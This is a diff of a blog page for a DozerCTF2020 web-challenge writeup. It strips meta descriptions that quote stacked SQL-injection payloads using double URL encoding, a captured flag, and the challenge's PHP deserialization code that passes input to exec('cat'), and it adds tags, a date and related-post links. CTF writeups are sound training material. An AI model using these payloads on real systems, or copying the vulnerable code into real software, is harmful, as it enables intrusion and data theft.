@@ -1,44 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
- sqli-labs 0 考点：URL二次编码，堆叠注入
-堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
-查看库名：
-?id=1%2527;show%20databases;%23 查看表名：
-?id=1%2527;show%20tables;%23查看表的第一条数据：
-?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
-白给的反序列化 考点：PHP反序列化
-开题送码：
-&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num &#43;= 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?'><title>DozerCTF2020_web</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='金陵科技学院主办的CTF比赛'><title>DozerCTF2020_web</title>
 
 <link rel='canonical' href='https://anthem-whisper.github.io/p/dozerctf2020_web/'>
 
 <link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='DozerCTF2020_web'>
-<meta property='og:description' content='又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
- sqli-labs 0 考点：URL二次编码，堆叠注入
-堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
-查看库名：
-?id=1%2527;show%20databases;%23 查看表名：
-?id=1%2527;show%20tables;%23查看表的第一条数据：
-?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
-白给的反序列化 考点：PHP反序列化
-开题送码：
-&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num &#43;= 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?'>
+<meta property='og:description' content='金陵科技学院主办的CTF比赛'>
 <meta property='og:url' content='https://anthem-whisper.github.io/p/dozerctf2020_web/'>
 <meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='XXE' /><meta property='article:tag' content='SQLi' /><meta property='article:published_time' content='2020-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-06-15T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="DozerCTF2020_web">
-<meta name="twitter:description" content="又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
- sqli-labs 0 考点：URL二次编码，堆叠注入
-堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
-查看库名：
-?id=1%2527;show%20databases;%23 查看表名：
-?id=1%2527;show%20tables;%23查看表的第一条数据：
-?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
-白给的反序列化 考点：PHP反序列化
-开题送码：
-&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num &#43;= 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?">
+<meta name="twitter:description" content="金陵科技学院主办的CTF比赛">
     </head>
     <body class="">
     <script>
@@ -213,12 +186,34 @@
 
     <div class="article-details">
     
+    <header class="article-category">
+        
+            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
+                CTF writeup
+            </a>
+        
+    </header>
+    
 
     <h2 class="article-title">
         <a href="/p/dozerctf2020_web/">DozerCTF2020_web</a>
     </h2>
 
-    </div>
+    
+    <h3 class="article-subtitle">
+        金陵科技学院主办的CTF比赛
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 15, 2020</time>
+    </footer></div>
 </header>
 
     <section class="article-content">
@@ -425,6 +420,14 @@ Array
 
     <footer class="article-footer">
     
+    <section class="article-tags">
+        
+            <a href="/tags/xxe/">XXE</a>
+        
+            <a href="/tags/sqli/">SQLi</a>
+        
+    </section>
+
 
     
     <section class="article-copyright">
@@ -445,6 +448,85 @@ Array
 
     <aside class="related-contents--wrapper">
     
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/hgame-2021-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HGAME 2021 Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">纵横杯 Writeup by X1cT34m</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/roarctf-2020/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RoarCTF 2020</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/n1ctf2020/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N1CTF2020</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">BUUOJ刷题记录(3)</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
     
 </aside>
 
